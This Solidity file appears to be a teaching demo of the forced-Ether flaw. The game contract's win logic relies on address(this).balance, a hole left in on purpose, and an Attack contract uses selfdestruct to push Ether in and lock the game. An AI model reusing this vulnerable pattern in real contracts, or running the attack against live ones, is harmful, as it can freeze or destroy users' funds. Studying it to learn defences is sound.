// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Tech4DevGame {
    uint public targetAmount = 10 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function GetReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    Tech4DevGame tech4devGame;

    constructor(Tech4DevGame _tech4devGame) {
        tech4devGame = Tech4DevGame(_tech4devGame);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 10 ether

        // cast address to payable
        address payable addr = payable(address(tech4devGame));
        selfdestruct(addr);
    }
}